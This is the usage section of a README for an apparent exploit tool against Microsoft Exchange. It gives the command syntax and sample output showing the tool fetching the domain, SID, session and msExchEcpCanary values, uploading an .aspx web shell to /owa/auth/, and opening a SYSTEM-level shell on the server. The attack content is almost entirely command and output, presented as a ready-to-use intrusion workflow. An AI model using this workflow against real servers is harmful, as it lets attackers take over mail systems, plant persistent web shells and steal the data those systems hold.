## Usage

```
python3 .\exchange-exp.py
使用方式: python PoC.py <target> <email>
使用方式: python PoC.py mail.exchange.cn administrator@exchange.cn
```



```
PS C:\> python3 .\exchange-exp.py mail.exchange.cn administrator@exchange.cn

[*] Getting ComputerName and DomainName
[+] domain :  xxx-xxxx
 |
[+] computer :  xxx.xxx-xxxx.xxx
 |
[*] Getting LegacyDN
[+] LegacyDN : /o=SCHMIDT-STEUER/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=06404e2e5d114531aa9477394e545b72-Administr
 |
[*] Getting SID
[+] SID : xxxxx
 |
[*] Getting session
[+] session : xxxxx
 |
[*] Getting msExchEcpCanary
[+] msExchEcpCanary : xxxxxx
 |
[*]Got OAB id
[+] OAB : xxxxxx
 |
[*]upload shell success
POST  shell:https://target/owa/auth/qwesdSDFASFQqeqweqsf.aspx
 |
[+] request shell now
 |
[*]Got shell success
 |

[+] 权限如下：nt-autorit\system

 |
[+] input exit or quit to exit !
PS C:\> hostname
exchange

PS C:\>

```





